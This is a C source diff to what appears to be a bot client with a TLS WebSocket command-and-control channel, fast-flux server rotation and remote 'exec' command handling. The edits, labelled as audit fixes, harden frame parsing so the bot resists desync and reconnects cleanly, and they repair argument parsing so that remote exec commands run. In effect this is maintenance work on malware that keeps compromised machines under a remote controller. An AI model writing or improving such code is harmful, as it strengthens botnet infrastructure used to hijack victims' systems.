@@ -2248,6 +2248,48 @@ int ws_send(notnet_bot_t *bot, const char *data, int len) {
     return result;
 }
 
+/* AUDIT FIX (#238/#274): sane upper bound on a single WS frame payload.
+ * Frames declaring more than this fail the connection instead of being
+ * drained — a hostile 64-bit length is a broken/malicious peer. */
+#define WS_MAX_FRAME (16u * 1024 * 1024)
+
+/* AUDIT FIX (#257): read exactly n bytes for a frame header extension or
+ * mask key. chan_recv (recv(2)) can return short on a TCP segment boundary;
+ * a bare `!= n` check left a half-consumed field in the stream and returned
+ * -1 with the connection still open — every subsequent frame then parsed
+ * from mid-field (same desync class #182 fixed for oversized payloads).
+ * Returns 1 on success, 0 on a TLS control-record boundary with nothing
+ * consumed yet, -1 on hard error or partial consumption. */
+static int ws_read_exact(notnet_bot_t *bot, uint8_t *dst, size_t n) {
+    size_t got = 0;
+    while (got < n) {
+        ssize_t r = chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock,
+                              (char *)dst + got, n - got);
+        if (r == -2) {
+            /* TLS control record consumed, no app data. Retryable only
+             * before any bytes of this field were consumed; past that the
+             * stream position is mid-field and the connection is done. */
+            return got == 0 ? 0 : -1;
+        }
+        if (r <= 0) return -1;
+        got += (size_t)r;
+    }
+    return 1;
+}
+
+/* AUDIT FIX (#257): fail the connection (mark disconnected, close socket)
+ * before returning -1 so the caller's reconnect path starts from a clean
+ * state instead of parsing a desynced stream. */
+static int ws_fail_conn(notnet_bot_t *bot) {
+    /* SECURITY FIX (#85): advance the flux IP so the reconnect
+     * targets the next A record. */
+    flux_mark_failed(bot, bot->c2_ws.server);
+    bot->c2_ws.connected = 0;
+    if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
+    bot->c2_ws.sock = -1;
+    return -1;
+}
+
 int ws_read(notnet_bot_t *bot, char *buf, int len) {
     if (!bot->c2_ws.connected) return -1;
 
@@ -2276,11 +2318,7 @@ int ws_read(notnet_bot_t *bot, char *buf, int len) {
         if (r <= 0) {
             /* SECURITY FIX (#85): advance the flux IP so the reconnect
              * targets the next A record. */
-            flux_mark_failed(bot, bot->c2_ws.server);
-            bot->c2_ws.connected = 0;
-            if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
-            bot->c2_ws.sock = -1;
-            return -1;
+            return ws_fail_conn(bot);
         }
         hdr_got += (size_t)r;
     }
@@ -2291,26 +2329,43 @@ int ws_read(notnet_bot_t *bot, char *buf, int len) {
     int masked = (frame_hdr[1] & 0x80) >> 7;
     uint8_t payload_len = frame_hdr[1] & 0x7F;
 
-    /* Determine actual payload length */
-    int plen = payload_len;
-    if (plen == 126) {
+    /* Determine actual payload length.
+     * AUDIT FIX (#238, #274): the 126/127 extended length forms are now
+     * accumulated into uint64_t — folding 8 wire bytes into a signed int
+     * caused signed overflow (UB) and negative plen values that slipped
+     * past the `plen > len - 1` guard below, skipping the read loop and
+     * desyncing the stream. */
+    uint64_t plen64 = payload_len;
+    if (plen64 == 126) {
         uint8_t ext[2] = {0};
-        if (chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)ext, 2) != 2) return -1;
-        plen = (ext[0] << 8) | ext[1];
-    } else if (plen == 127) {
+        if (ws_read_exact(bot, ext, sizeof(ext)) < 0) return ws_fail_conn(bot);
+        plen64 = ((uint64_t)ext[0] << 8) | (uint64_t)ext[1];
+    } else if (plen64 == 127) {
         uint8_t ext[8] = {0};
-        if (chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)ext, 8) != 8) return -1;
-        plen = 0;
+        if (ws_read_exact(bot, ext, sizeof(ext)) < 0) return ws_fail_conn(bot);
+        plen64 = 0;
         for (int i = 0; i < 8; i++) {
-            plen = (plen << 8) | ext[i];
+            plen64 = (plen64 << 8) | (uint64_t)ext[i];
         }
     }
+    /* AUDIT FIX (#238/#274): reject frames declaring more than WS_MAX_FRAME
+     * outright — the declared length cannot be trusted, so the stream is
+     * not worth draining. */
+    if (plen64 > WS_MAX_FRAME) {
+        log_warn("WS: frame declares %llu bytes > cap %u — failing connection",
+                 (unsigned long long)plen64, (unsigned)WS_MAX_FRAME);
+        return ws_fail_conn(bot);
+    }
+    int plen = (int)plen64;
 
     /* Read mask key if present (server-to-client frames are unmasked,
-     * but we handle both cases) */
+     * but we handle both cases).
+     * AUDIT FIX (#257): short reads here must close the connection —
+     * returning -1 with connected==1 and a half-consumed field in the
+     * stream desynced every subsequent frame parse. */
     uint8_t mask[4] = {0};
     if (masked) {
-        if (chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)mask, 4) != 4) return -1;
+        if (ws_read_exact(bot, mask, sizeof(mask)) < 0) return ws_fail_conn(bot);
     }
 
     /* Read payload.
@@ -2760,7 +2815,11 @@ int protocol_process_commands(notnet_bot_t *bot) {
             char *sp = args + strlen(cmd_name);
             while (*sp == ' ' || *sp == '\t') sp++;
             if (*sp) {
-                snprintf(arg1, sizeof(arg1), "%255s", sp);
+                /* AUDIT FIX (#344): this must be a printf PRECISION (%.255s),
+                 * not a field width (%255s) — the width right-justifies and
+                 * left-pads arg1 with spaces, so strchr(arg1, ' ') always hit
+                 * index 0 and every one-argument exec was rejected. */
+                snprintf(arg1, sizeof(arg1), "%.255s", sp);
                 char *extra = strchr(arg1, ' ');
                 if (!extra) extra = strchr(arg1, '\t');
                 if (extra) {
